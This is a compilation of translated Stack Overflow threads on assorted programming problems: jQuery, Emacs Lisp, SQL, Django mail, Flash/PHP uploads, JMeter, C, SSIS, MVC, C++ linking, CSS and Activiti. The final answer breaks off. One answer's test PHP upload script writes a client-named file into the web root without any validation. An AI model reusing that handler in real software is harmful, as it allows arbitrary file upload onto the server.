# jquery - 正确使用 jQuery `stop`

> ID：11847542
> 
> 赞同：1
> 
> 时间：2012-08-07T13:53:47.153
> 
> 标签：jquery, mouseover, fade

我了解`stop()`jQuery 中的方法用于`Stop the currently-running animation on the matched elements`（根据 jQuery.com）。我的网站上有一个图片库，当用户将鼠标悬停在图片的缩略图上时，图片就会被加载。`.click()`当我使用而不是时，这非常有效`.mouseover()`；但是，当我更改为`mouseover`图像的加载时，图像的加载有点滞后，而且对于流畅的鼠标悬停效果来说太慢了。我想尝试使用 .stop() 以便当用户积极地将鼠标从一个图像移动到另一个图像时没有延迟，但我正在使用的代码似乎根本没有太大的影响。

该网站可以通过[点击这里查看](http://blacktiephotographers.com/weddings/)

```
function showCurrent(img){
            inAnimation=true;
            img.toggleClass('current').stop().fadeIn(100,function(){
                var title=img.attr('title');
                inAnimation=false;
            });

            current.fadeOut(function(){
                current.removeClass('current'); 
            });
            current=img;
        } 
```

发生了什么：

`showCurrent()`当鼠标移动缩略图时调用该函数。当前图像被赋予适当的类别，然后淡入（如您所见非常快，我将其设置为 100 毫秒）。所以，我认为这应该非常流畅和快速，但事实并非如此。我在这里做错了什么？

# linux - 确定使用最大内存 (RAM) 的进程？

> ID：11847546
> 
> 赞同：1
> 
> 时间：2012-08-07T13:53:57.530
> 
> 标签：linux, unix, process

我对 linux 进程管理几乎没有疑问：

如何确定使用系统中最大内存量 (RAM) 的进程 (PID)？

我在谷歌上搜索了这个问题，但没有找到有用的解决方案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:04:07.350

假设内存是指驻留集大小（RSS）

```
ps axh -o pid --sort -rss | head -n 1 
```

# regex - Emacs 正则表达式计数出现次数

> ID：11847547
> 
> 赞同：15
> 
> 时间：2012-08-07T13:53:59.543
> 
> 标签：regex, emacs

我正在寻找*最快*的例程（非交互式）来获取字符串中正则表达式的匹配数。

就像是

```
(count-occurrences "a" "alabama")
=> 4 
```

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-08-07T14:34:31.890

`count-matches`以交互方式进行。也许是一个开始寻找的好地方。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-08-07T14:37:49.357

`how-many`(aliased `count-matches`) 这样做，但适用于缓冲区。

这是一个适用于字符串的方法：

```
(defun how-many-str (regexp str)
  (loop with start = 0
        for count from 0
        while (string-match regexp str start)
        do (setq start (match-end 0))
        finally return count)) 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-08-07T15:01:18.623

这是使用递归和累加器的更实用的答案。作为一个额外的好处，它不使用`cl`：

```
(defun count-occurences (regex string)
  (recursive-count regex string 0))

(defun recursive-count (regex string start)
  (if (string-match regex string start)
      (+ 1 (recursive-count regex string (match-end 0)))
    0)) 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-12-07T12:40:08.360

在 package [s](http://github.com/magnars/s.el)中，有 function `s-count-matches`。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-12-08T14:52:20.160

这是一个不使用堆栈的 emacs-lisp 函数

```
(defun count-occurences-in-string (pattern string)
  "Count occurences of PATTERN in STRING."
  (let ((occurences 0)
        (start 0)
        (length (length string)))
    (while (and
            (< start length)
            (string-match pattern string start))
      (setq occurences (1+ occurences))
      (setq start (match-end 0)))
    occurences)) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-01-30T03:23:34.373

如果创建变量副本没有任何问题，可以尝试

```
(- (length (split-string "Hello World" "o")) 1)
(- (length (split-string "aaabaaa" "a")) 1)
(- (length (split-string "This
string
has three
newlines" "
")) 1) 
```

```
2
6
3 
```

如果您在加载包时没有任何问题`cl-lib`，那么您可以尝试

```
(require 'cl-lib)

(cl-count ?o "Hello World")
(cl-count ?a "aaabaaa")
(cl-count ?
 "This
string
has three
newlines") 
```

```
2
6
3 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2021-12-08T21:09:19.260

我可能会这样做：

```
(defun count-occurrences (regexp string)
  "Return the number of occurrences of REGEXP in STRING."
  (let ((count 0))
    (with-temp-buffer
      (save-excursion (insert string))
      (while (re-search-forward regexp nil t)
        (cl-incf count)))
    count)) 
```

# sql - If there are more than x Then where 语句

> ID：11847551
> 
> 赞同：0
> 
> 时间：2012-08-07T13:54:06.233
> 
> 标签：sql, sql-server, sql-server-2008, tsql, sql-server-2008-r2

无论如何，有没有让 HAVING 和 WHERE 子句相互猜想？即伪代码：

```
CASE
   HAVING count(children) > 3 THEN WHERE nationality = 'Mexican'
   HAVING count(children) = 2 THEN WHERE nationality = 'American'
   HAVING count(children) = 1 THEN WHERE nationality = 'Japanese'
END 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:59:46.633

您可以将查询包装在另一个`SELECT`

```
SELECT *
FROM
(
    SELECT count(children) as ChildrenCount, nationality 
    FROM yourTable
    GROUP BY nationality 
) x
WHERE 
    (ChildrenCount > 3 AND nationality = 'Mexican')
    OR
    (ChildrenCount = 2 AND nationality = 'American')
    OR
    (ChildrenCount = 1 AND nationality = 'Japanese') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:01:42.030

你想要的逻辑是什么？

让我猜猜你想要有 3 个以上孩子的墨西哥人、有 2 个孩子的美国人和有 1 个孩子的日本人。在这种情况下，你会这样：

```
having (case when count(nationality = 'Mexican' then children end) > 3 then 'true'
             when count(nationality = 'American' then children end) = 2 then 'true'
             when count(nationality = 'Japanese' then children end) = 1 then 'true'
        end) = 'true' 
```

然而，即使这看起来也很奇怪。为什么要数“孩子”。你在分组什么？如果 children 只是数据中的一个字段，那么这应该是 WHERE 子句而不是 HAVING 子句：

```
where (nationality = 'Mexican' and children end > 3) or
      (nationality = 'American' and children = 2) or
      (nationality = 'Japanese' and children = 1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T16:22:15.140

这应该有效

```
DECLARE @table TABLE     
(    
     nationality varchar (25),  
     totalchildren int
)   

insert @table  
    SELECT nationality,COUNT(children) AS totalchildren 
    FROM TABLENAME
    GROUP BY nationality

SELECT
    *
FROM
    @table  
WHERE 
    nationality = 
    (
        CASE 
            WHEN totalchildren > 3 THEN 'Mexican'
            WHEN totalchildren = 2 THEN 'American'
            WHEN totalchildren = 1 THEN 'Japanese' 
        END
    ) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T13:58:44.290

您可以将现有查询包装在 CTE 中，以将计数和分组与过滤分开，然后在带有 CASE 的最终 WHERE 子句中使用 CTE 中的计数：

```
;WITH [Counts] AS
(
    SELECT
        ,nationality
        ,COUNT(children) AS [children]
    FROM
        xyz
    GROUP BY
        nationality
)
SELECT
    *
FROM
    [Counts]
WHERE 
    nationality = 
    (
        CASE 
            WHEN [children] > 3 THEN 'Mexican'
            WHEN [children] = 2 THEN 'American'
            WHEN [children] = 1 THEN 'Japanese' 
        END
    ) 
```

# django - 使用 django send_mail 发送短信

> ID：11847553
> 
> 赞同：1
> 
> 时间：2012-08-07T13:54:09.713
> 
> 标签：django, email, sms

我使用每个移动电话运营商的地址通过电子邮件发送 SMS 文本消息（例如，verizon 是“phonenumber@vtext.com”）。

但是，有两个问题：

1) send_mail 需要一个“主题”和一个“来自电子邮件”。当接收到文本时，主题，这是不必要的，只是用完消息中的宝贵字符，出现在文本消息的括号中，在消息正文之前。我试图设置subject=None，但我只是得到（无）作为主题。知道如何在使用 send_mail 发送时摆脱主题或不使用它吗？

2) from_email 导致 SMS 消息报告它来自 'bounces+246181-....'，我假设是因为它不知道如何处理 from_email 字段，或者因为它不匹配。如果我直接从我的电子邮件客户端发送 SMS 消息，它会正确报告发件人。任何想法如何摆脱“反弹......”

这是一个例子：

```
from django.core.mail import send_mail
subject = None
message = 'testing 123'
from_email = 'webmaster@smartcarpools.com'
to = '4041111111'

send_mail(subject,message,from_email,to,fail_silently=False) 
```

谢谢！

******* 新信息**

 **我发现“反弹”字符串的问题与使用 sendgrid 发送电子邮件和将它们发送到 verizon 运营商之间的冲突有关。默认情况下，Sendgrid 会混淆发件人信息（可以禁用）。这搞砸了接收到的文本上显示的“发件人”信息。使用 sendgrid 禁用此功能可解决问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T15:17:09.037

我测试了以下

```
from django.core.mail import send_mail
send_mail('','test','',['my_number@mynetwork']) 
```

and I received this text:

```
FRM:admin@example.com
MSG:test 
```

So you can keep the subject as an empty string to keep the subject from showing.**

# actionscript - 在服务器上使用 PHP 保存图像的 AS3

> ID：11847554
> 
> 赞同：0
> 
> 时间：2012-08-07T13:54:09.930
> 
> 标签：actionscript

我将 3 个参数从 AS3/flash 传递到 PHP 服务器，前 2 个参数是字符串，第三个是编码的 JPG 图像。在发送之前，图像从 byteArray 保存在本地，因此我可以检查编码是否正常，然后使用 PHP POST 与其他 2 个参数一起发送。

问题是：前 2 个参数是可以的，但第三个（jpg 编码图像）不是，我`Ã¿ÃÃ¿Ã `在服务器端得到类似的东西，或者这样，几个字符就是这样。同时在本地驱动器上（实际上是在发送到服务器之前） JPG 可见，可以打开并查看所有内容，但在服务器上，就像我说的那样，我看到了新的 .jpg 文件，但里面只有几个字符。

在服务器端，我正在使用以下方式写入数据：

```
$fh = fopen($myFile, 'w') or die("can't open file"); 
```

Flash 提供消息

> 错误：错误 #2101：传递给 URLVariables.decode() 的字符串必须是包含名称/值对的 URL 编码查询字符串。

所以我看到所有 3 个参数的上传都已执行，2 个可以，而第 3 个（图像）不是。

那么我做错了什么？我同时传递 2 个字符串变量和 1 个图像的问题是什么？还是带有标题的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T15:42:10.347

上传文件时，我一直使用 FileReference 对象的 upload() 方法。这是一个简单的 ActionScript 3 应用程序，它向您展示了如何使用 Flash 上传文件，同时通过请求传递其他参数（它们将作为 GET/querystring 参数传递：

```
package
{

    import flash.display.Sprite;
    import flash.events.DataEvent;
    import flash.events.Event;
    import flash.events.HTTPStatusEvent;
    import flash.events.IEventDispatcher;
    import flash.events.IOErrorEvent;
    import flash.events.MouseEvent;
    import flash.events.ProgressEvent;
    import flash.events.SecurityErrorEvent;
    import flash.net.FileFilter;
    import flash.net.FileReference;
    import flash.net.URLLoader;
    import flash.net.URLLoaderDataFormat;
    import flash.net.URLRequest;
    import flash.net.URLRequestMethod;
    import flash.net.URLVariables;
    import flash.text.TextField;
    import flash.text.TextFieldAutoSize;

    public class FileUploader extends Sprite
    {

        private var request:URLRequest;
        private var file:FileReference;

        public function FileUploader() {
            var theText:TextField = new TextField();
            theText.text = "Click here to select file!";
            theText.autoSize = TextFieldAutoSize.CENTER;
            this.addChild(theText);
            theText.addEventListener(MouseEvent.CLICK, selectFile);
            request = new URLRequest();
            request.url = "http://192.168.178.75/upload/upload.php";
        }

        private function selectFile(evt:Event):void {
            file = new FileReference();
            configureListeners(file);
            file.browse(getTypes());
        }

        public function uploadImage(file:FileReference):void {
            var myData:URLVariables = new URLVariables();
            myData.user = "valueOfUserParam";
            myData.filename = file.name;
            request.data = myData;
            // "filedata": in PHP, the file can be accessed using $_FILE['filedata']
            file.upload(request, "filedata");
        }

        private function configureListeners(dispatcher:IEventDispatcher):void {
            dispatcher.addEventListener(Event.CANCEL, cancelHandler);
            dispatcher.addEventListener(Event.COMPLETE, completeHandler);
            dispatcher.addEventListener(HTTPStatusEvent.HTTP_STATUS, httpStatusHandler);
            dispatcher.addEventListener(IOErrorEvent.IO_ERROR, ioErrorHandler);
            dispatcher.addEventListener(Event.OPEN, openHandler);
            dispatcher.addEventListener(ProgressEvent.PROGRESS, progressHandler);
            dispatcher.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);
            dispatcher.addEventListener(Event.SELECT, selectHandler);
            dispatcher.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA,uploadCompleteDataHandler);
        }

        private function getTypes():Array {
            var allTypes:Array = new Array(getImageTypeFilter(), getTextTypeFilter());
            return allTypes;
        }

        private function getImageTypeFilter():FileFilter {
            return new FileFilter("Images (*.jpg, *.jpeg, *.gif, *.png)", "*.jpg;*.jpeg;*.gif;*.png");
        }

        private function getTextTypeFilter():FileFilter {
            return new FileFilter("Text Files (*.txt, *.rtf)", "*.txt;*.rtf");
        }

        private function cancelHandler(event:Event):void {
            trace("cancelHandler: " + event);
        }

        private function completeHandler(event:Event):void {
            trace("completeHandler: " + event);
        }

        private function uploadCompleteDataHandler(event:Event):void {
            trace("uploadCompleteData: " + event);
        }

        private function httpStatusHandler(event:HTTPStatusEvent):void {
            trace("httpStatusHandler: " + event);
        }

        private function ioErrorHandler(event:IOErrorEvent):void {
            trace("ioErrorHandler: " + event);
        }

        private function openHandler(event:Event):void {
            trace("openHandler: " + event);
        }

        private function progressHandler(event:ProgressEvent):void {
            var file:FileReference = FileReference(event.target);
            trace("progressHandler name=" + file.name + " bytesLoaded=" + event.bytesLoaded + " bytesTotal=" + event.bytesTotal);
        }

        private function securityErrorHandler(event:SecurityErrorEvent):void {
            trace("securityErrorHandler: " + event);
        }

        private function selectHandler(event:Event):void {
            var file:FileReference = FileReference(event.target);
            trace("selectHandler: name=" + file.name + " URL=" + request.url);
            this.uploadImage(file);
        }

    }
} 
```

我用于测试的服务器端 PHP 代码：

```
<?php
// In PHP versions earlier than 4.1.0, $HTTP_POST_FILES should be used instead
// of $_FILES.

$uploaddir = $_SERVER['DOCUMENT_ROOT']."/img/";

header("content-type: text/xml");
?><result>
<?php
if (empty($_FILES)) { ?>
  <message>No file has been uploaded!</message>
<?php
} else {
  $filename = $_FILES['filedata']['name'];
  // Mark the file with a timestamp
  $filename = str_replace(".jpg", time().".jpg", $filename);
  $uploadfile = $uploaddir . $filename;
  $success = move_uploaded_file($_FILES['filedata']['tmp_name'], $uploadfile);

  if ($success)  {
?>
  <message>File is valid, and was successfully uploaded</message>
  <debug>
    <files><![CDATA[<?php print_r($_FILES); ?>]]></files>
    <post><![CDATA[<?php print_r($_POST); ?>]]></post>
    <get><![CDATA[<?php print_r($_GET); ?>]]></get>
  </debug>
<?php
    } else {
?>
  <message>File upload failed miserably</message>
<?php
    }
}
?>
</result> 
```

将 PHP 文件放入网络服务器的根文件夹，图像应上传到子文件夹 img - 您必须创建该子文件夹。

调试模式下的跟踪输出应如下所示：

```
selectHandler: name=Penny_test.jpg URL=http://localhost/upload/upload.php
openHandler: [Event type="open" bubbles=false cancelable=false eventPhase=2]
progressHandler name=Penny_test.jpg bytesLoaded=11201 bytesTotal=11201
completeHandler: [Event type="complete" bubbles=false cancelable=false eventPhase=2]
uploadCompleteData: [DataEvent type="uploadCompleteData" bubbles=false cancelable=false eventPhase=2 data="<result>
  <message>File is valid, and was successfully uploaded</message>
  <debug>
    <files><![CDATA[Array
(
    [filedata] => Array
        (
            [name] => Penny_test.jpg
            [type] => application/octet-stream
            [tmp_name] => /tmp/phpaUurZr
            [error] => 0
            [size] => 11201
        )

)
]]></files>
    <post><![CDATA[Array
(
    [Filename] => Penny_test.jpg
    [Upload] => Submit Query
)
]]></post>
    <get><![CDATA[Array
(
    [filename] => Penny_test.jpg
    [user] => valueOfUserParam
)
]]></get>
  </debug>
</result>"] 
```

# loops - JMeter - 具有可变循环计数的循环控制器

> ID：11847557
> 
> 赞同：16
> 
> 时间：2012-08-07T13:54:16.763
> 
> 标签：loops, jmeter

我正在使用 JMeter，我想定义一个循环控制器。在这个循环中，我想用 Jmeter 变量定义循环计数。这可能吗？

非常感谢

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2015-11-04T10:42:55.783

我知道帮助你已经很晚了，但它可以帮助其他人。

一种很好的方法是在循环控制器内定义一个[计数器。](http://jmeter.apache.org/usermanual/component_reference.html#Counter)

例如，如果您想要一个具有 20 次迭代的循环，则将 20 放入循环控制器和您放入 0 到 19 的计数器中。在计数器中，您还可以定义一个增量。输出变量在`Reference Name`字段中命名。

[![带计数器的循环控制器](../Images/85e96d046580c76230d0940b4cc46268.png)](https://i.stack.imgur.com/xBuSw.png)

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-08-07T18:55:33.020

是的，这是可能的。

[使用用户定义变量组件](http://jmeter.apache.org/usermanual/component_reference.html#User_Defined_Variables)定义您的用户变量，或使用[CSV 组件](http://jmeter.apache.org/usermanual/component_reference.html#CSV_Data_Set_Config)。

然后，在循环控制器中，将循环计数定义为：${nameOfVar}

从 JMeter 4.0 版本开始，有一个更简单的方法：

*   [https://jmeter.apache.org/usermanual/component_reference.html#Loop_Controller](https://jmeter.apache.org/usermanual/component_reference.html#Loop_Controller)

JMeter 会将循环索引公开为一个名为的变量

> __jm__你的元素名称__idx

例如，如果您的 Loop Controller 名为 LC，那么您可以通过 ${__jm__LC__idx} 访问循环索引。索引从 0 开始

如果你想正确地学习 jmeter，这[本书](https://leanpub.com/master-jmeter-from-load-test-to-devops)会对你有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-01-06T17:14:42.673

您可以在“循环计数”字段中使用以下内容：

`${myVar}`

例如随机计数：

`${__groovy(java.util.concurrent.ThreadLocalRandom.current().nextLong(128L),)}`

`${__jm__Loop Controller__idx}`您可以通过where`Loop Controller`是循环的名称访问当前循环索引（从 0 开始） 。

# c - 在c中交换数组元素

> ID：11847558
> 
> 赞同：1
> 
> 时间：2012-08-07T13:54:17.800
> 
> 标签：c

我希望你能帮忙。我正在尝试编写一个程序，“给定一个包含 10 个整数的列表（数组），找到绝对值最小的那个，然后将其位置与最后一个交换并输出新列表。

这是我编码的内容，但没有交换..

```
#include stdio.h
#include math.h

int main() {

    int array[10];
    int arraynew[10];
    int absmallest = 0;
    int index = 0;
    int i;
    for (i = 0; i < 10; i++) {
        scanf("%d", &array[i]);
    }
    absmallest = array[0];

    for (i = 0; i < 10; i++) {
        if (abs(array[i]) < absmallest)
            absmallest = array[i];
        index = i;
    }

    int temp;
    temp = array[9];
    array[9] = array[index];
    array[index] = temp;

    for (i = 0; i < 10; i++) {
        printf("%d", array[i]);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T13:57:46.333

两个问题：

**(1)**

```
 if (abs(array[i]) < absmallest)
        absmallest = array[i];
    index = i; 
```

超出了 if 语句的`index = i`范围 - 因此它每次迭代都会发生，并且不取决于您的条件的结果。

**(2)**
`absmallest = array[0];`也应该是 with `abs()`（如果 会发生什么`array[0] = -5`）？`abssmallest`for 循环中的赋值也是如此（`absmallest = array[i];`应该是`absmallest = abs(array[i]);`）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T13:56:10.350

您需要更新您的`index`内部`if`- 语句。

```
if (abs(array[i]) < absmallest)
    absmallest = array[i];
index = i; 
```

应该

```
if (abs(array[i]) < absmallest)
{
    absmallest = array[i];
    index = i;
} 
```

否则，您将`index`在每个循环中更新您的。

* * *

**编辑：**正如@a​​mit 所说，您还需要存储绝对值，而不是真实值。换句话说

```
absmallest = array[i]; 
```

应该

```
absmallest = abs( array[i] ); 
```

同样的初始化`absmallest`

```
absmallest = abs( array[0] ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:00:04.090

```
if (abs(array[i]) < absmallest)
    absmallest = array[i];
index = i; 
```

应该成为

```
if (abs(array[i]) < absmallest) {
    absmallest = array[i];
    index = i;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T14:03:59.480

```
for (i = 0; i < 10; i++) {
     if (abs(array[i]) < absmallest)
         absmallest = array[index = i];
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-07T13:57:17.053

在这个循环中：

```
for (i = 0; i < 10; i++) {
    if (abs(array[i]) < absmallest)
        absmallest = array[i];
    index = i;
} 
```

`index` *您每次都*设置变量。这意味着当循环结束时`index`将是最后一个元素的索引。

此外，您可能应该初始化`absmallest`为`abs(array[0])`。

# sql-server - 是否可以远程执行 SSIS 包？

> ID：11847563
> 
> 赞同：0
> 
> 时间：2012-08-07T13:54:43.410
> 
> 标签：sql-server, ssis

我想从另一台计算机执行存储在 SQL 服务器（2008 R2）上的 SSIS 包。但是，我在网上找到的所有内容都涉及从服务器加载包然后在本地运行它。

是否可以在服务器上运行该软件包？任何资源表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-08T13:14:05.713

要执行一个包，您通常会创建一个新作业并使用一个作业步骤来启动所需的包。

1.  如果您在远程计算机上安装了 sql server management studio(ssms)，您只需连接到数据库引擎并开始工作。或者，您可以使用 ssms 连接到集成服务并直接启动包。

2.  如果没有可用的 ssms，您可以使用存储过程启动作业`sp_start_job`。你可以使用这样的东西[来](http://sqlanalyzer.codeplex.com/)执行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:28:20.197

您可以在远程服务器中执行存储过程 sp_start_job。我已经成功地使用了它（创建一个存储过程来控制一点参数化）。

[http://msdn.microsoft.com/en-us/library/ms186757.aspx](http://msdn.microsoft.com/en-us/library/ms186757.aspx)

# c# - Modify Html Helpers in ASP.NET MVC3 with razor

> ID：11847566
> 
> 赞同：1
> 
> 时间：2012-08-07T13:54:54.030
> 
> 标签：c#, asp.net-mvc-3, razor, html-helper

i have the following Problem:

I want to know if it is possible to modify default html helper methods, e.g. the Html.BeginForm() method.

I know that i can write a custom helper method where i can add some stuff, but some of them have alot of overloaded functions.

then only thing i would need is, that you can add some custom html string "after" the element was rendered

e.g.:

```
@using(Html.BeginForm("setDate", "DateController", new { DateId = Model.Date.Identifier }, FormMethod.Post, new { id = "setDateForm" })) {
    @* some input here... *@
} 
```

and after the

```
<form></form> 
```

i would like to render a validation script, or something else, lets say jQuery validator:

```
<script>$('#setDateForm').validate();</script> 
```

since i dont want to do that over and over again (maybe i could forget it once..) it would be nice to modify the default Html helper.

If it is not possible i just might have to write my own BeginForm or a wrapper for the EndForm helper :/

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:36:46.930

As a very basic starting point, you could use something like this:

```
namespace YourProject.Helpers
{
    public static class HtmlHelperExtensions
    {
        public static IDisposable CustomBeginForm(this HtmlHelper helper, string html)
        {
            return new MvcFormExtension(helper, html);
        }

        private class MvcFormExtension : IDisposable
        {
            private HtmlHelper helper;
            private MvcForm form;
            private string html;

            public MvcFormExtension(HtmlHelper helper, string html)
            {
                this.helper = helper;
                this.form = this.helper.BeginForm();
                this.html = html;
            }

            public void Dispose()
            {
                form.EndForm();
                helper.ViewContext.Writer.Write(this.html);
            }
        }
    }
} 
```

You'd either need to add the namespace in your view or add it to the web.config file in your Views folder. After that, you can use it like so:

```
@using (Html.CustomBeginForm("<p>test</p>")) {
    // Additional markup here
} 
```

This works for me here but you'd certainly need to customise it to fit your needs, especially as you'll likely want to pass additional parameters to `Html.BeginForm()`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:07:01.810

You may be able to write your own Extension method do this. Get the code of the BeginForm method from Codeplex.(The MVC3 source code is [open source](http://aspnet.codeplex.com/) :) ) and make relevant updates to that to render the form like you want.

The code is available in the `FormExtensions.cs` class under the `System.Web.MVC` Project. Look for the FormHelper method which is being called from the BeginForm Overrides.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:00:47.070

It is not possible. You'll have to do your own helpers.

# c++ - C ++ LNK2005“已定义”错误-引用自身的文件

> ID：11847570
> 
> 赞同：0
> 
> 时间：2012-08-07T13:55:06.417
> 
> 标签：c++, visual-studio-2008, compiler-construction, lnk2005

我继承了一个带有 3 个项目的 C++ 解决方案，一个编译为 .DLL，另外两个编译为 .EXEs 。DLL 可以自行构建，但其他两个在构建时会产生大约 65 个 LNK2005 错误，其中大部分是引用相同的 .obj 文件，如下面的日志所示：

* * *

```
Linking...
Function.obj : warning LNK4075: ignoring '/EDITANDCONTINUE' due to '/OPT:ICF' specification
Function.obj : error LNK2005: _ReadLocalRegister already defined in Function.obj
Function.obj : error LNK2005: _getSource already defined in Function.obj
Function.obj : error LNK2005: _SendLogEvent already defined in Function.obj
Function.obj : error LNK2005: _DebugMsg already defined in Function.obj
Function.obj : error LNK2005: _MyInformationMsg already defined in Function.obj
MyNTService.obj : error LNK2005: "public: __thiscall CMyNTService::CMyNTService(void)" (??0CMyNTService@@QAE@XZ) already defined in MyNTService.obj
MyNTService.obj : error LNK2005: "public: virtual void __thiscall CMyNTService::OnStop(void)" (?OnStop@CMyNTService@@UAEXXZ) already defined in MyNTService.obj
MyNTService.obj : error LNK2005: "public: void __thiscall CMyNTService::SaveStatus(void)" (?SaveStatus@CMyNTService@@QAEXXZ) already defined in MyNTService.obj 
```

* * *

....所以它继续！

我是一名 C# 编码员，只有基本的 C++ 知识，所以我对此感到迷茫。该解决方案是一个已有 15 年历史的 C 解决方案，我正在尝试在 VS2008 中将其重建为 C++ 解决方案。我已经设法构建了一次，没有任何改变，但也许从那时起一些配置设置已经改变。

有没有人有想法我可以开始寻找......？

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:03:04.463

听起来您在该对象的头文件中缺少包含保护。

添加：

```
#ifndef SomeUniqueName
#define SomeUniqueName

//Code goes here.

#endif 
```

将代码包装在头文件中。编译器在处理您的代码时会多次检查该头文件，因为它包含在许多地方（很可能）。包含守卫停止重新定义在之前的传递中已经定义的事物。

**PS：它也可能有助于做一个“清理”。Makefiles 可能很麻烦，特别是如果没有 100% 正确，有时当依赖关系关闭时，您需要在重建之前清理。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-01-13T14:39:21.487

在 msvc110 (2012) 中，我遇到了同样的错误，我发现的唯一解决方法是为我在不同文件中使用的循环函数创建一个类和一个单独的 DLL。这是这样做的[链接。](https://msdn.microsoft.com/en-us/library/ms235636.aspx)

干杯

# html - 粘性页脚表现得很奇怪

> ID：11847571
> 
> 赞同：0
> 
> 时间：2012-08-07T13:55:09.260
> 
> 标签：html, css, position, sticky-footer

我为我的网站制作了一个粘性页脚，但它不像我想要的那样。我希望它完全位于底部，始终取决于内容的长度。相反，它总是按原样出现在屏幕上。谁能帮我 ？

[本站](http://www.thomasteilmann.dk/powerdisco)

页脚CSS：

```
#footer{
position: fixed;
bottom: 0;
z-index: 1;
width: 100%;
height: 50px;
clear: both;
background-image: url("../images/footer_pattern.png"); 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:38:17.853

```
#footer{
width: 100%;
height: 50px;
clear: both;
background-image: url("../images/footer_pattern.png");
display: block;
margin-top: 0px;
//if contains children add overflow:hidden;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:29:13.177

你的问题有点含糊，但如果我理解正确，我认为你正在寻找的是位置：相对。

```
position: relative;
bottom: 10px; 
```

它的作用是在元素和下一个相对父元素之间添加指定数量的空间（10px）。祝你好运！

# c# - 如何查看网站上的按钮点击等，以便我可以在 webbrowser-control 中以编程方式调用它？

> ID：11847572
> 
> 赞同：0
> 
> 时间：2012-08-07T13:55:15.470
> 
> 标签：c#, webbrowser-control

假设我去一个随机站点并单击一个按钮。例如，google.com 上的搜索按钮恰好被命名为 btnK，我可以通过执行以下操作在 C# webbrowser 控件中重现该单击：

```
HtmlElementCollection elc = this.webBrowser1.Document.GetElementsByTagName("input");

foreach (HtmlElement el in elc)
{
    if (el.GetAttribute("type").Equals("submit") && el.GetAttribute("name") == "btnK") 
        el.InvokeMember("click");
} 
```

但是我如何轻松地“调试”一个网站并查看执行了哪些操作以便我知道单击了哪个按钮？

# jquery-ui - 修改 jquery 小部件

> ID：11847576
> 
> 赞同：0
> 
> 时间：2012-08-07T13:55:44.480
> 
> 标签：jquery-ui, jquery-plugins, widget

我正在使用 Eric Hynds 的多选小部件。

我想修改它，添加一个选项并在 _refresh 方法中包含一个额外的步骤。现在我可以轻松地修改插件来实现我的目标，但我想做的是创建一个包装器或类似的东西，这意味着我可以在将来更新小部件，同时保持我的更改分开。

该小部件是使用 jquery ui 1.8 小部件工厂构建的。

实现我的目标的最佳方式是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T15:36:30.617

在不知道所有详细信息的情况下，您可以尝试扩展小部件。

```
$.extend($.widget, {refresh:function(){your function here}}); 
```

我用它来向小部件添加功能，但不用于覆盖现有功能。

您还尝试使用继承，这可能是正确的调用。定义新小部件时，有一个参数可以传入现有的基本小部件

```
(function ($) {
$.widget('an.originalwidget', $.a.yourwidget, {
    ...
    refresh: function() {
        // override code
    }
});
}(jQuery)); 
```

这是一个很好的尝试链接：http: [//msdn.microsoft.com/en-us/library/hh404085](http://msdn.microsoft.com/en-us/library/hh404085)

编辑：我使用 Jquery 1.7.2 进行了此操作，我注意到您使用的是 1.8，虽然我认为不会对此进行任何更改，您可能需要检查

# java - 如何以编程方式创建 Activiti 多实例任务？

> ID：11847579
> 
> 赞同：1
> 
> 时间：2012-08-07T13:55:46.780
> 
> 标签：java, bpmn, activiti

我尝试以编程方式创建多实例工作流。

我得到了这些工作正常的 BPMN xml：

```
<userTask id="multiTask" name="Review task ${loopCounter}" activiti:assignee="${reviewer}">
  <multiInstanceLoopCharacteristics isSequential="false" activiti:collection="reviewersList" activiti:elementVariable="reviewer">
    <completionCondition>${nrOfCompletedInstances > maxReviewer }</completionCondition>        
  </multiInstanceLoopCharacteristics>
</userTask> 
```

我怎么能用纯Java做这些？我从这些开始：

```
MultiInstanceLoopCharacteristics loopChar = new MultiInstanceLoopCharacteristics(); 
```

但我不知道该怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-02T15:11:41.533

我想您希望它以编程方式部署业务流程。我想将 a 链接`org.activiti.bpmn.model.MultiInstanceLoopCharacteristics`到 a 的方法`org.activiti.bpmn.model.Task`是这样的：

```
